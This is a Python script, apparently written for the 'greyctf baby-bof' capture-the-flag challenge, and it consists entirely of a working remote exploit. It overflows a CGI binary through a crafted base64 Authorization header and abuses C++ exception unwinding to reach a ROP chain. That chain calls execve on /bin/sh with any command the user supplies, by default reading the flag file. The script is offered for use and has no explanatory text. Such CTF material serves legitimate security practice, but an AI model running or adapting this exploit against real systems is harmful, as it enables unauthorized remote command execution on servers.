#!/usr/bin/env python3
import argparse
import base64
import http.client
import struct


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


# Gadgets in the challenge's static, non-PIE index.cgi build.
POP_RDI = 0x403265
POP_RSI = 0x405F45
POP_RDX_RBX = 0x484767
POP_RAX = 0x4558D7
MOV_QWORD_RDI_RAX = 0x40485F
SYSCALL = 0x401A7D
BSS = 0x4C8000

# Equivalent of the reference binary's 0x40a3e5 call-site PC, shifted in this
# build. The C++ unwinder uses this to select basic_string::reserve's landing
# pad, which reaches __cxa_end_catch and returns into our overflowed stack.
RESERVE_LANDING_SELECTOR = 0x40A4C5


def qwords(data: bytes) -> list[int]:
    data += b"\0"
    data += b"\0" * ((8 - len(data) % 8) % 8)
    return [struct.unpack("<Q", data[i : i + 8])[0] for i in range(0, len(data), 8)]


def write_qword(address: int, value: int) -> list[int]:
    return [POP_RDI, address, POP_RAX, value, MOV_QWORD_RDI_RAX]


def build_auth_header(command: str) -> str:
    binsh = BSS
    dashc = BSS + 0x10
    cmd = BSS + 0x20
    argv = BSS + 0x100

    rop: list[int] = []
    for i, value in enumerate(qwords(b"/bin/sh")):
        rop += write_qword(binsh + i * 8, value)
    for i, value in enumerate(qwords(b"-c")):
        rop += write_qword(dashc + i * 8, value)
    for i, value in enumerate(qwords(command.encode())):
        rop += write_qword(cmd + i * 8, value)
    for i, value in enumerate([binsh, dashc, cmd, 0]):
        rop += write_qword(argv + i * 8, value)

    rop += [
        POP_RAX,
        59,  # execve
        POP_RDI,
        binsh,
        POP_RSI,
        argv,
        POP_RDX_RBX,
        0,
        0,
        SYSCALL,
    ]

    decoded = bytearray(b"A" * 0x180)
    decoded[0x110:0x118] = p64(0)
    decoded[0x118:0x120] = p64(RESERVE_LANDING_SELECTOR)

    offset = 0x158
    for value in rop:
        if offset + 8 > len(decoded):
            decoded.extend(b"A" * (offset + 8 - len(decoded)))
        decoded[offset : offset + 8] = p64(value)
        offset += 8

    # Avoid '=' padding. The trailing '!!!!' must be parsed after the overflow
    # so the invalid-base64 exception triggers the unwinder path we control.
    while len(decoded) % 3:
        decoded.append(0x41)

    return "Basic " + base64.b64encode(decoded).decode() + "!!!!"


def request_once(host: str, port: int, path: str, auth: str, timeout: float) -> tuple[int, str]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path, headers={"Authorization": auth, "Connection": "close"})
        response = conn.getresponse()
        body = response.read().decode("latin1", "replace")
        return response.status, body
    finally:
        conn.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Remote exploit for greyctf baby-bof.")
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=32367)
    parser.add_argument("command", nargs="?", default="cat /flag.txt")
    parser.add_argument("--path", default="/")
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    status, body = request_once(
        args.host,
        args.port,
        args.path,
        build_auth_header(args.command),
        args.timeout,
    )
    print(f"HTTP {status}")
    if body:
        print(body, end="" if body.endswith("\n") else "\n")


if __name__ == "__main__":
    main()
